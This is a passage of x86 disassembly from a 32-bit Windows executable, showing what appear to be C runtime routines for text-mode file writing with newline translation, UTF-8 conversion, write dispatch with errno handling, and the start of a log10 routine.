  408544:	89 8d f0 eb ff ff    	mov    %ecx,-0x1410(%ebp)
  40854a:	89 85 f8 eb ff ff    	mov    %eax,-0x1408(%ebp)
  408550:	eb 65                	jmp    0x4085b7
  408552:	8d bd fc eb ff ff    	lea    -0x1404(%ebp),%edi
  408558:	3b d8                	cmp    %eax,%ebx
  40855a:	73 1e                	jae    0x40857a
  40855c:	8a 03                	mov    (%ebx),%al
  40855e:	43                   	inc    %ebx
  40855f:	3c 0a                	cmp    $0xa,%al
  408561:	75 07                	jne    0x40856a
  408563:	ff 46 08             	incl   0x8(%esi)
  408566:	c6 07 0d             	movb   $0xd,(%edi)
  408569:	47                   	inc    %edi
  40856a:	88 07                	mov    %al,(%edi)
  40856c:	8d 45 fb             	lea    -0x5(%ebp),%eax
  40856f:	47                   	inc    %edi
  408570:	3b f8                	cmp    %eax,%edi
  408572:	8b 85 f8 eb ff ff    	mov    -0x1408(%ebp),%eax
  408578:	72 de                	jb     0x408558
  40857a:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  408580:	2b f8                	sub    %eax,%edi
  408582:	8d 85 f4 eb ff ff    	lea    -0x140c(%ebp),%eax
  408588:	6a 00                	push   $0x0
  40858a:	50                   	push   %eax
  40858b:	57                   	push   %edi
  40858c:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  408592:	50                   	push   %eax
  408593:	51                   	push   %ecx
  408594:	ff 15 64 c0 40 00    	call   *0x40c064
  40859a:	85 c0                	test   %eax,%eax
  40859c:	74 1f                	je     0x4085bd
  40859e:	8b 85 f4 eb ff ff    	mov    -0x140c(%ebp),%eax
  4085a4:	01 46 04             	add    %eax,0x4(%esi)
  4085a7:	3b c7                	cmp    %edi,%eax
  4085a9:	72 1a                	jb     0x4085c5
  4085ab:	8b 85 f8 eb ff ff    	mov    -0x1408(%ebp),%eax
  4085b1:	8b 8d f0 eb ff ff    	mov    -0x1410(%ebp),%ecx
  4085b7:	3b d8                	cmp    %eax,%ebx
  4085b9:	72 97                	jb     0x408552
  4085bb:	eb 08                	jmp    0x4085c5
  4085bd:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  4085c3:	89 06                	mov    %eax,(%esi)
  4085c5:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4085c8:	8b c6                	mov    %esi,%eax
  4085ca:	5f                   	pop    %edi
  4085cb:	5e                   	pop    %esi
  4085cc:	33 cd                	xor    %ebp,%ecx
  4085ce:	5b                   	pop    %ebx
  4085cf:	e8 f4 91 ff ff       	call   0x4017c8
  4085d4:	8b e5                	mov    %ebp,%esp
  4085d6:	5d                   	pop    %ebp
  4085d7:	c3                   	ret
  4085d8:	8b ff                	mov    %edi,%edi
  4085da:	55                   	push   %ebp
  4085db:	8b ec                	mov    %esp,%ebp
  4085dd:	b8 10 14 00 00       	mov    $0x1410,%eax
  4085e2:	e8 79 27 00 00       	call   0x40ad60
  4085e7:	a1 04 30 41 00       	mov    0x413004,%eax
  4085ec:	33 c5                	xor    %ebp,%eax
  4085ee:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4085f1:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4085f4:	8b c1                	mov    %ecx,%eax
  4085f6:	c1 f8 06             	sar    $0x6,%eax
  4085f9:	83 e1 3f             	and    $0x3f,%ecx
  4085fc:	6b c9 30             	imul   $0x30,%ecx,%ecx
  4085ff:	53                   	push   %ebx
  408600:	8b 5d 10             	mov    0x10(%ebp),%ebx
  408603:	8b 04 85 50 40 41 00 	mov    0x414050(,%eax,4),%eax
  40860a:	56                   	push   %esi
  40860b:	8b 75 08             	mov    0x8(%ebp),%esi
  40860e:	57                   	push   %edi
  40860f:	8b 4c 08 18          	mov    0x18(%eax,%ecx,1),%ecx
  408613:	8b 45 14             	mov    0x14(%ebp),%eax
  408616:	03 c3                	add    %ebx,%eax
  408618:	89 8d f0 eb ff ff    	mov    %ecx,-0x1410(%ebp)
  40861e:	33 d2                	xor    %edx,%edx
  408620:	89 85 f8 eb ff ff    	mov    %eax,-0x1408(%ebp)
  408626:	89 16                	mov    %edx,(%esi)
  408628:	89 56 04             	mov    %edx,0x4(%esi)
  40862b:	89 56 08             	mov    %edx,0x8(%esi)
  40862e:	eb 75                	jmp    0x4086a5
  408630:	8d bd fc eb ff ff    	lea    -0x1404(%ebp),%edi
  408636:	3b d8                	cmp    %eax,%ebx
  408638:	73 2b                	jae    0x408665
  40863a:	0f b7 03             	movzwl (%ebx),%eax
  40863d:	83 c3 02             	add    $0x2,%ebx
  408640:	83 f8 0a             	cmp    $0xa,%eax
  408643:	75 0d                	jne    0x408652
  408645:	83 46 08 02          	addl   $0x2,0x8(%esi)
  408649:	6a 0d                	push   $0xd
  40864b:	5a                   	pop    %edx
  40864c:	66 89 17             	mov    %dx,(%edi)
  40864f:	83 c7 02             	add    $0x2,%edi
  408652:	66 89 07             	mov    %ax,(%edi)
  408655:	8d 45 fa             	lea    -0x6(%ebp),%eax
  408658:	83 c7 02             	add    $0x2,%edi
  40865b:	3b f8                	cmp    %eax,%edi
  40865d:	8b 85 f8 eb ff ff    	mov    -0x1408(%ebp),%eax
  408663:	72 d1                	jb     0x408636
  408665:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  40866b:	2b f8                	sub    %eax,%edi
  40866d:	8d 85 f4 eb ff ff    	lea    -0x140c(%ebp),%eax
  408673:	6a 00                	push   $0x0
  408675:	50                   	push   %eax
  408676:	83 e7 fe             	and    $0xfffffffe,%edi
  408679:	8d 85 fc eb ff ff    	lea    -0x1404(%ebp),%eax
  40867f:	57                   	push   %edi
  408680:	50                   	push   %eax
  408681:	51                   	push   %ecx
  408682:	ff 15 64 c0 40 00    	call   *0x40c064
  408688:	85 c0                	test   %eax,%eax
  40868a:	74 1f                	je     0x4086ab
  40868c:	8b 85 f4 eb ff ff    	mov    -0x140c(%ebp),%eax
  408692:	01 46 04             	add    %eax,0x4(%esi)
  408695:	3b c7                	cmp    %edi,%eax
  408697:	72 1a                	jb     0x4086b3
  408699:	8b 85 f8 eb ff ff    	mov    -0x1408(%ebp),%eax
  40869f:	8b 8d f0 eb ff ff    	mov    -0x1410(%ebp),%ecx
  4086a5:	3b d8                	cmp    %eax,%ebx
  4086a7:	72 87                	jb     0x408630
  4086a9:	eb 08                	jmp    0x4086b3
  4086ab:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  4086b1:	89 06                	mov    %eax,(%esi)
  4086b3:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4086b6:	8b c6                	mov    %esi,%eax
  4086b8:	5f                   	pop    %edi
  4086b9:	5e                   	pop    %esi
  4086ba:	33 cd                	xor    %ebp,%ecx
  4086bc:	5b                   	pop    %ebx
  4086bd:	e8 06 91 ff ff       	call   0x4017c8
  4086c2:	8b e5                	mov    %ebp,%esp
  4086c4:	5d                   	pop    %ebp
  4086c5:	c3                   	ret
  4086c6:	8b ff                	mov    %edi,%edi
  4086c8:	55                   	push   %ebp
  4086c9:	8b ec                	mov    %esp,%ebp
  4086cb:	b8 18 14 00 00       	mov    $0x1418,%eax
  4086d0:	e8 8b 26 00 00       	call   0x40ad60
  4086d5:	a1 04 30 41 00       	mov    0x413004,%eax
  4086da:	33 c5                	xor    %ebp,%eax
  4086dc:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4086df:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  4086e2:	8b c1                	mov    %ecx,%eax
  4086e4:	c1 f8 06             	sar    $0x6,%eax
  4086e7:	83 e1 3f             	and    $0x3f,%ecx
  4086ea:	6b c9 30             	imul   $0x30,%ecx,%ecx
  4086ed:	53                   	push   %ebx
  4086ee:	56                   	push   %esi
  4086ef:	8b 04 85 50 40 41 00 	mov    0x414050(,%eax,4),%eax
  4086f6:	33 db                	xor    %ebx,%ebx
  4086f8:	8b 75 08             	mov    0x8(%ebp),%esi
  4086fb:	57                   	push   %edi
  4086fc:	8b 44 08 18          	mov    0x18(%eax,%ecx,1),%eax
  408700:	8b 4d 10             	mov    0x10(%ebp),%ecx
  408703:	8b f9                	mov    %ecx,%edi
  408705:	89 85 ec eb ff ff    	mov    %eax,-0x1414(%ebp)
  40870b:	8b 45 14             	mov    0x14(%ebp),%eax
  40870e:	03 c1                	add    %ecx,%eax
  408710:	89 1e                	mov    %ebx,(%esi)
  408712:	89 5e 04             	mov    %ebx,0x4(%esi)
  408715:	89 85 f4 eb ff ff    	mov    %eax,-0x140c(%ebp)
  40871b:	89 5e 08             	mov    %ebx,0x8(%esi)
  40871e:	3b c8                	cmp    %eax,%ecx
  408720:	0f 83 ba 00 00 00    	jae    0x4087e0
  408726:	8b b5 f4 eb ff ff    	mov    -0x140c(%ebp),%esi
  40872c:	8d 85 50 f9 ff ff    	lea    -0x6b0(%ebp),%eax
  408732:	3b fe                	cmp    %esi,%edi
  408734:	73 21                	jae    0x408757
  408736:	0f b7 0f             	movzwl (%edi),%ecx
  408739:	83 c7 02             	add    $0x2,%edi
  40873c:	83 f9 0a             	cmp    $0xa,%ecx
  40873f:	75 09                	jne    0x40874a
  408741:	6a 0d                	push   $0xd
  408743:	5a                   	pop    %edx
  408744:	66 89 10             	mov    %dx,(%eax)
  408747:	83 c0 02             	add    $0x2,%eax
  40874a:	66 89 08             	mov    %cx,(%eax)
  40874d:	83 c0 02             	add    $0x2,%eax
  408750:	8d 4d f8             	lea    -0x8(%ebp),%ecx
  408753:	3b c1                	cmp    %ecx,%eax
  408755:	72 db                	jb     0x408732
  408757:	53                   	push   %ebx
  408758:	53                   	push   %ebx
  408759:	68 55 0d 00 00       	push   $0xd55
  40875e:	8d 8d f8 eb ff ff    	lea    -0x1408(%ebp),%ecx
  408764:	51                   	push   %ecx
  408765:	8d 8d 50 f9 ff ff    	lea    -0x6b0(%ebp),%ecx
  40876b:	2b c1                	sub    %ecx,%eax
  40876d:	d1 f8                	sar    $1,%eax
  40876f:	50                   	push   %eax
  408770:	8b c1                	mov    %ecx,%eax
  408772:	50                   	push   %eax
  408773:	53                   	push   %ebx
  408774:	68 e9 fd 00 00       	push   $0xfde9
  408779:	ff 15 e8 c0 40 00    	call   *0x40c0e8
  40877f:	8b 75 08             	mov    0x8(%ebp),%esi
  408782:	89 85 e8 eb ff ff    	mov    %eax,-0x1418(%ebp)
  408788:	85 c0                	test   %eax,%eax
  40878a:	74 4c                	je     0x4087d8
  40878c:	6a 00                	push   $0x0
  40878e:	8d 8d f0 eb ff ff    	lea    -0x1410(%ebp),%ecx
  408794:	2b c3                	sub    %ebx,%eax
  408796:	51                   	push   %ecx
  408797:	50                   	push   %eax
  408798:	8d 85 f8 eb ff ff    	lea    -0x1408(%ebp),%eax
  40879e:	03 c3                	add    %ebx,%eax
  4087a0:	50                   	push   %eax
  4087a1:	ff b5 ec eb ff ff    	push   -0x1414(%ebp)
  4087a7:	ff 15 64 c0 40 00    	call   *0x40c064
  4087ad:	85 c0                	test   %eax,%eax
  4087af:	74 27                	je     0x4087d8
  4087b1:	03 9d f0 eb ff ff    	add    -0x1410(%ebp),%ebx
  4087b7:	8b 85 e8 eb ff ff    	mov    -0x1418(%ebp),%eax
  4087bd:	3b d8                	cmp    %eax,%ebx
  4087bf:	72 cb                	jb     0x40878c
  4087c1:	8b c7                	mov    %edi,%eax
  4087c3:	2b 45 10             	sub    0x10(%ebp),%eax
  4087c6:	89 46 04             	mov    %eax,0x4(%esi)
  4087c9:	3b bd f4 eb ff ff    	cmp    -0x140c(%ebp),%edi
  4087cf:	73 0f                	jae    0x4087e0
  4087d1:	33 db                	xor    %ebx,%ebx
  4087d3:	e9 4e ff ff ff       	jmp    0x408726
  4087d8:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  4087de:	89 06                	mov    %eax,(%esi)
  4087e0:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4087e3:	8b c6                	mov    %esi,%eax
  4087e5:	5f                   	pop    %edi
  4087e6:	5e                   	pop    %esi
  4087e7:	33 cd                	xor    %ebp,%ecx
  4087e9:	5b                   	pop    %ebx
  4087ea:	e8 d9 8f ff ff       	call   0x4017c8
  4087ef:	8b e5                	mov    %ebp,%esp
  4087f1:	5d                   	pop    %ebp
  4087f2:	c3                   	ret
  4087f3:	6a 14                	push   $0x14
  4087f5:	68 d0 19 41 00       	push   $0x4119d0
  4087fa:	e8 11 99 ff ff       	call   0x402110
  4087ff:	8b 75 08             	mov    0x8(%ebp),%esi
  408802:	83 fe fe             	cmp    $0xfffffffe,%esi
  408805:	75 18                	jne    0x40881f
  408807:	e8 1c c0 ff ff       	call   0x404828
  40880c:	83 20 00             	andl   $0x0,(%eax)
  40880f:	e8 27 c0 ff ff       	call   0x40483b
  408814:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  40881a:	e9 b6 00 00 00       	jmp    0x4088d5
  40881f:	85 f6                	test   %esi,%esi
  408821:	0f 88 96 00 00 00    	js     0x4088bd
  408827:	3b 35 50 42 41 00    	cmp    0x414250,%esi
  40882d:	0f 83 8a 00 00 00    	jae    0x4088bd
  408833:	8b de                	mov    %esi,%ebx
  408835:	c1 fb 06             	sar    $0x6,%ebx
  408838:	8b c6                	mov    %esi,%eax
  40883a:	83 e0 3f             	and    $0x3f,%eax
  40883d:	6b c8 30             	imul   $0x30,%eax,%ecx
  408840:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  408843:	8b 04 9d 50 40 41 00 	mov    0x414050(,%ebx,4),%eax
  40884a:	0f b6 44 08 28       	movzbl 0x28(%eax,%ecx,1),%eax
  40884f:	83 e0 01             	and    $0x1,%eax
  408852:	74 69                	je     0x4088bd
  408854:	56                   	push   %esi
  408855:	e8 47 d4 ff ff       	call   0x405ca1
  40885a:	59                   	pop    %ecx
  40885b:	83 cf ff             	or     $0xffffffff,%edi
  40885e:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  408861:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  408865:	8b 04 9d 50 40 41 00 	mov    0x414050(,%ebx,4),%eax
  40886c:	8b 4d e0             	mov    -0x20(%ebp),%ecx
  40886f:	f6 44 08 28 01       	testb  $0x1,0x28(%eax,%ecx,1)
  408874:	75 15                	jne    0x40888b
  408876:	e8 c0 bf ff ff       	call   0x40483b
  40887b:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  408881:	e8 a2 bf ff ff       	call   0x404828
  408886:	83 20 00             	andl   $0x0,(%eax)
  408889:	eb 14                	jmp    0x40889f
  40888b:	ff 75 10             	push   0x10(%ebp)
  40888e:	ff 75 0c             	push   0xc(%ebp)
  408891:	56                   	push   %esi
  408892:	e8 47 00 00 00       	call   0x4088de
  408897:	83 c4 0c             	add    $0xc,%esp
  40889a:	8b f8                	mov    %eax,%edi
  40889c:	89 7d e4             	mov    %edi,-0x1c(%ebp)
  40889f:	c7 45 fc fe ff ff ff 	movl   $0xfffffffe,-0x4(%ebp)
  4088a6:	e8 0a 00 00 00       	call   0x4088b5
  4088ab:	8b c7                	mov    %edi,%eax
  4088ad:	eb 29                	jmp    0x4088d8
  4088af:	8b 75 08             	mov    0x8(%ebp),%esi
  4088b2:	8b 7d e4             	mov    -0x1c(%ebp),%edi
  4088b5:	56                   	push   %esi
  4088b6:	e8 09 d4 ff ff       	call   0x405cc4
  4088bb:	59                   	pop    %ecx
  4088bc:	c3                   	ret
  4088bd:	e8 66 bf ff ff       	call   0x404828
  4088c2:	83 20 00             	andl   $0x0,(%eax)
  4088c5:	e8 71 bf ff ff       	call   0x40483b
  4088ca:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  4088d0:	e8 6e bd ff ff       	call   0x404643
  4088d5:	83 c8 ff             	or     $0xffffffff,%eax
  4088d8:	e8 79 98 ff ff       	call   0x402156
  4088dd:	c3                   	ret
  4088de:	8b ff                	mov    %edi,%edi
  4088e0:	55                   	push   %ebp
  4088e1:	8b ec                	mov    %esp,%ebp
  4088e3:	83 ec 30             	sub    $0x30,%esp
  4088e6:	a1 04 30 41 00       	mov    0x413004,%eax
  4088eb:	33 c5                	xor    %ebp,%eax
  4088ed:	89 45 fc             	mov    %eax,-0x4(%ebp)
  4088f0:	8b 4d 10             	mov    0x10(%ebp),%ecx
  4088f3:	89 4d f8             	mov    %ecx,-0x8(%ebp)
  4088f6:	56                   	push   %esi
  4088f7:	8b 75 08             	mov    0x8(%ebp),%esi
  4088fa:	57                   	push   %edi
  4088fb:	8b 7d 0c             	mov    0xc(%ebp),%edi
  4088fe:	89 7d d0             	mov    %edi,-0x30(%ebp)
  408901:	85 c9                	test   %ecx,%ecx
  408903:	75 07                	jne    0x40890c
  408905:	33 c0                	xor    %eax,%eax
  408907:	e9 ce 01 00 00       	jmp    0x408ada
  40890c:	85 ff                	test   %edi,%edi
  40890e:	75 1f                	jne    0x40892f
  408910:	e8 13 bf ff ff       	call   0x404828
  408915:	21 38                	and    %edi,(%eax)
  408917:	e8 1f bf ff ff       	call   0x40483b
  40891c:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  408922:	e8 1c bd ff ff       	call   0x404643
  408927:	83 c8 ff             	or     $0xffffffff,%eax
  40892a:	e9 ab 01 00 00       	jmp    0x408ada
  40892f:	53                   	push   %ebx
  408930:	8b c6                	mov    %esi,%eax
  408932:	8b de                	mov    %esi,%ebx
  408934:	c1 fb 06             	sar    $0x6,%ebx
  408937:	83 e0 3f             	and    $0x3f,%eax
  40893a:	6b d0 30             	imul   $0x30,%eax,%edx
  40893d:	89 5d e4             	mov    %ebx,-0x1c(%ebp)
  408940:	8b 04 9d 50 40 41 00 	mov    0x414050(,%ebx,4),%eax
  408947:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40894a:	89 55 e8             	mov    %edx,-0x18(%ebp)
  40894d:	8a 5c 10 29          	mov    0x29(%eax,%edx,1),%bl
  408951:	80 fb 02             	cmp    $0x2,%bl
  408954:	74 05                	je     0x40895b
  408956:	80 fb 01             	cmp    $0x1,%bl
  408959:	75 28                	jne    0x408983
  40895b:	8b c1                	mov    %ecx,%eax
  40895d:	f7 d0                	not    %eax
  40895f:	a8 01                	test   $0x1,%al
  408961:	75 1d                	jne    0x408980
  408963:	e8 c0 be ff ff       	call   0x404828
  408968:	83 20 00             	andl   $0x0,(%eax)
  40896b:	e8 cb be ff ff       	call   0x40483b
  408970:	c7 00 16 00 00 00    	movl   $0x16,(%eax)
  408976:	e8 c8 bc ff ff       	call   0x404643
  40897b:	e9 51 01 00 00       	jmp    0x408ad1
  408980:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  408983:	f6 44 10 28 20       	testb  $0x20,0x28(%eax,%edx,1)
  408988:	74 0f                	je     0x408999
  40898a:	6a 02                	push   $0x2
  40898c:	6a 00                	push   $0x0
  40898e:	6a 00                	push   $0x0
  408990:	56                   	push   %esi
  408991:	e8 45 04 00 00       	call   0x408ddb
  408996:	83 c4 10             	add    $0x10,%esp
  408999:	56                   	push   %esi
  40899a:	e8 e4 fa ff ff       	call   0x408483
  40899f:	59                   	pop    %ecx
  4089a0:	84 c0                	test   %al,%al
  4089a2:	74 39                	je     0x4089dd
  4089a4:	84 db                	test   %bl,%bl
  4089a6:	74 22                	je     0x4089ca
  4089a8:	fe cb                	dec    %bl
  4089aa:	80 fb 01             	cmp    $0x1,%bl
  4089ad:	0f 87 ee 00 00 00    	ja     0x408aa1
  4089b3:	ff 75 f8             	push   -0x8(%ebp)
  4089b6:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4089b9:	57                   	push   %edi
  4089ba:	50                   	push   %eax
  4089bb:	e8 56 fa ff ff       	call   0x408416
  4089c0:	83 c4 0c             	add    $0xc,%esp
  4089c3:	8b f0                	mov    %eax,%esi
  4089c5:	e9 9c 00 00 00       	jmp    0x408a66
  4089ca:	ff 75 f8             	push   -0x8(%ebp)
  4089cd:	8d 45 ec             	lea    -0x14(%ebp),%eax
  4089d0:	57                   	push   %edi
  4089d1:	56                   	push   %esi
  4089d2:	50                   	push   %eax
  4089d3:	e8 8b f8 ff ff       	call   0x408263
  4089d8:	83 c4 10             	add    $0x10,%esp
  4089db:	eb e6                	jmp    0x4089c3
  4089dd:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  4089e0:	8b 0c 85 50 40 41 00 	mov    0x414050(,%eax,4),%ecx
  4089e7:	8b 45 e8             	mov    -0x18(%ebp),%eax
  4089ea:	f6 44 01 28 80       	testb  $0x80,0x28(%ecx,%eax,1)
  4089ef:	74 46                	je     0x408a37
  4089f1:	0f be c3             	movsbl %bl,%eax
  4089f4:	83 e8 00             	sub    $0x0,%eax
  4089f7:	74 2e                	je     0x408a27
  4089f9:	83 e8 01             	sub    $0x1,%eax
  4089fc:	74 19                	je     0x408a17
  4089fe:	83 e8 01             	sub    $0x1,%eax
  408a01:	0f 85 9a 00 00 00    	jne    0x408aa1
  408a07:	ff 75 f8             	push   -0x8(%ebp)
  408a0a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408a0d:	57                   	push   %edi
  408a0e:	56                   	push   %esi
  408a0f:	50                   	push   %eax
  408a10:	e8 c3 fb ff ff       	call   0x4085d8
  408a15:	eb c1                	jmp    0x4089d8
  408a17:	ff 75 f8             	push   -0x8(%ebp)
  408a1a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408a1d:	57                   	push   %edi
  408a1e:	56                   	push   %esi
  408a1f:	50                   	push   %eax
  408a20:	e8 a1 fc ff ff       	call   0x4086c6
  408a25:	eb b1                	jmp    0x4089d8
  408a27:	ff 75 f8             	push   -0x8(%ebp)
  408a2a:	8d 45 ec             	lea    -0x14(%ebp),%eax
  408a2d:	57                   	push   %edi
  408a2e:	56                   	push   %esi
  408a2f:	50                   	push   %eax
  408a30:	e8 c4 fa ff ff       	call   0x4084f9
  408a35:	eb a1                	jmp    0x4089d8
  408a37:	8b 44 01 18          	mov    0x18(%ecx,%eax,1),%eax
  408a3b:	33 c9                	xor    %ecx,%ecx
  408a3d:	51                   	push   %ecx
  408a3e:	89 4d ec             	mov    %ecx,-0x14(%ebp)
  408a41:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  408a44:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  408a47:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  408a4a:	51                   	push   %ecx
  408a4b:	ff 75 f8             	push   -0x8(%ebp)
  408a4e:	57                   	push   %edi
  408a4f:	50                   	push   %eax
  408a50:	ff 15 64 c0 40 00    	call   *0x40c064
  408a56:	85 c0                	test   %eax,%eax
  408a58:	75 09                	jne    0x408a63
  408a5a:	ff 15 a8 c0 40 00    	call   *0x40c0a8
  408a60:	89 45 ec             	mov    %eax,-0x14(%ebp)
  408a63:	8d 75 ec             	lea    -0x14(%ebp),%esi
  408a66:	8d 7d d8             	lea    -0x28(%ebp),%edi
  408a69:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408a6a:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408a6b:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  408a6c:	8b 45 dc             	mov    -0x24(%ebp),%eax
  408a6f:	85 c0                	test   %eax,%eax
  408a71:	75 63                	jne    0x408ad6
  408a73:	8b 45 d8             	mov    -0x28(%ebp),%eax
  408a76:	85 c0                	test   %eax,%eax
  408a78:	74 24                	je     0x408a9e
  408a7a:	6a 05                	push   $0x5
  408a7c:	5e                   	pop    %esi
  408a7d:	3b c6                	cmp    %esi,%eax
  408a7f:	75 14                	jne    0x408a95
  408a81:	e8 b5 bd ff ff       	call   0x40483b
  408a86:	c7 00 09 00 00 00    	movl   $0x9,(%eax)
  408a8c:	e8 97 bd ff ff       	call   0x404828
  408a91:	89 30                	mov    %esi,(%eax)
  408a93:	eb 3c                	jmp    0x408ad1
  408a95:	50                   	push   %eax
  408a96:	e8 6a bd ff ff       	call   0x404805
  408a9b:	59                   	pop    %ecx
  408a9c:	eb 33                	jmp    0x408ad1
  408a9e:	8b 7d d0             	mov    -0x30(%ebp),%edi
  408aa1:	8b 45 e4             	mov    -0x1c(%ebp),%eax
  408aa4:	8b 4d e8             	mov    -0x18(%ebp),%ecx
  408aa7:	8b 04 85 50 40 41 00 	mov    0x414050(,%eax,4),%eax
  408aae:	f6 44 08 28 40       	testb  $0x40,0x28(%eax,%ecx,1)
  408ab3:	74 09                	je     0x408abe
  408ab5:	80 3f 1a             	cmpb   $0x1a,(%edi)
  408ab8:	75 04                	jne    0x408abe
  408aba:	33 c0                	xor    %eax,%eax
  408abc:	eb 1b                	jmp    0x408ad9
  408abe:	e8 78 bd ff ff       	call   0x40483b
  408ac3:	c7 00 1c 00 00 00    	movl   $0x1c,(%eax)
  408ac9:	e8 5a bd ff ff       	call   0x404828
  408ace:	83 20 00             	andl   $0x0,(%eax)
  408ad1:	83 c8 ff             	or     $0xffffffff,%eax
  408ad4:	eb 03                	jmp    0x408ad9
  408ad6:	2b 45 e0             	sub    -0x20(%ebp),%eax
  408ad9:	5b                   	pop    %ebx
  408ada:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  408add:	5f                   	pop    %edi
  408ade:	33 cd                	xor    %ebp,%ecx
  408ae0:	5e                   	pop    %esi
  408ae1:	e8 e2 8c ff ff       	call   0x4017c8
  408ae6:	8b e5                	mov    %ebp,%esp
  408ae8:	5d                   	pop    %ebp
  408ae9:	c3                   	ret
  408aea:	cc                   	int3
  408aeb:	cc                   	int3
  408aec:	cc                   	int3
  408aed:	cc                   	int3
  408aee:	cc                   	int3
  408aef:	cc                   	int3
  408af0:	83 3d a4 42 41 00 00 	cmpl   $0x0,0x4142a4
  408af7:	0f 84 82 00 00 00    	je     0x408b7f
  408afd:	83 ec 08             	sub    $0x8,%esp
  408b00:	0f ae 5c 24 04       	stmxcsr 0x4(%esp)
  408b05:	8b 44 24 04          	mov    0x4(%esp),%eax
  408b09:	25 80 7f 00 00       	and    $0x7f80,%eax
  408b0e:	3d 80 1f 00 00       	cmp    $0x1f80,%eax
  408b13:	75 0f                	jne    0x408b24
  408b15:	d9 3c 24             	fnstcw (%esp)
  408b18:	66 8b 04 24          	mov    (%esp),%ax
  408b1c:	66 83 e0 7f          	and    $0x7f,%ax
  408b20:	66 83 f8 7f          	cmp    $0x7f,%ax
  408b24:	8d 64 24 08          	lea    0x8(%esp),%esp
  408b28:	75 55                	jne    0x408b7f
  408b2a:	e9 99 04 00 00       	jmp    0x408fc8
  408b2f:	90                   	nop
  408b30:	83 3d a4 42 41 00 00 	cmpl   $0x0,0x4142a4
  408b37:	74 32                	je     0x408b6b
  408b39:	83 ec 08             	sub    $0x8,%esp
  408b3c:	0f ae 5c 24 04       	stmxcsr 0x4(%esp)
  408b41:	8b 44 24 04          	mov    0x4(%esp),%eax
  408b45:	25 80 7f 00 00       	and    $0x7f80,%eax
  408b4a:	3d 80 1f 00 00       	cmp    $0x1f80,%eax
  408b4f:	75 0f                	jne    0x408b60
  408b51:	d9 3c 24             	fnstcw (%esp)
  408b54:	66 8b 04 24          	mov    (%esp),%ax
  408b58:	66 83 e0 7f          	and    $0x7f,%ax
  408b5c:	66 83 f8 7f          	cmp    $0x7f,%ax
  408b60:	8d 64 24 08          	lea    0x8(%esp),%esp
  408b64:	75 05                	jne    0x408b6b
  408b66:	e9 45 04 00 00       	jmp    0x408fb0
  408b6b:	83 ec 0c             	sub    $0xc,%esp
  408b6e:	dd 14 24             	fstl   (%esp)
  408b71:	e8 52 0b 00 00       	call   0x4096c8
  408b76:	e8 0d 00 00 00       	call   0x408b88
  408b7b:	83 c4 0c             	add    $0xc,%esp
  408b7e:	c3                   	ret
  408b7f:	8d 54 24 04          	lea    0x4(%esp),%edx
  408b83:	e8 fd 0a 00 00       	call   0x409685
  408b88:	52                   	push   %edx
  408b89:	9b d9 3c 24          	fstcw  (%esp)
  408b8d:	74 4c                	je     0x408bdb
  408b8f:	8b 44 24 0c          	mov    0xc(%esp),%eax
  408b93:	66 81 3c 24 7f 02    	cmpw   $0x27f,(%esp)
  408b99:	74 06                	je     0x408ba1
  408b9b:	d9 2d 98 ff 40 00    	fldcw  0x40ff98
  408ba1:	a9 00 00 f0 7f       	test   $0x7ff00000,%eax
  408ba6:	74 5e                	je     0x408c06
  408ba8:	a9 00 00 00 80       	test   $0x80000000,%eax
  408bad:	75 41                	jne    0x408bf0
  408baf:	d9 ec                	fldlg2
  408bb1:	d9 c9                	fxch   %st(1)
  408bb3:	d9 f1                	fyl2x
  408bb5:	83 3d 88 42 41 00 00 	cmpl   $0x0,0x414288
  408bbc:	0f 85 1c 0b 00 00    	jne    0x4096de
  408bc2:	8d 0d 90 fd 40 00    	lea    0x40fd90,%ecx
  408bc8:	ba 1b 00 00 00       	mov    $0x1b,%edx
  408bcd:	e9 19 0b 00 00       	jmp    0x4096eb
  408bd2:	a9 00 00 00 80       	test   $0x80000000,%eax
  408bd7:	75 17                	jne    0x408bf0
  408bd9:	eb d4                	jmp    0x408baf
  408bdb:	a9 ff ff 0f 00       	test   $0xfffff,%eax
  408be0:	75 1d                	jne    0x408bff
  408be2:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
  408be7:	75 16                	jne    0x408bff
  408be9:	25 00 00 00 80       	and    $0x80000000,%eax
  408bee:	74 c5                	je     0x408bb5
  408bf0:	dd d8                	fstp   %st(0)
  408bf2:	db 2d 50 ff 40 00    	fldt   0x40ff50
  408bf8:	b8 01 00 00 00       	mov    $0x1,%eax
  408bfd:	eb 22                	jmp    0x408c21
  408bff:	e8 68 0a 00 00       	call   0x40966c
  408c04:	eb 1b                	jmp    0x408c21
  408c06:	a9 ff ff 0f 00       	test   $0xfffff,%eax
  408c0b:	75 c5                	jne    0x408bd2
  408c0d:	83 7c 24 08 00       	cmpl   $0x0,0x8(%esp)
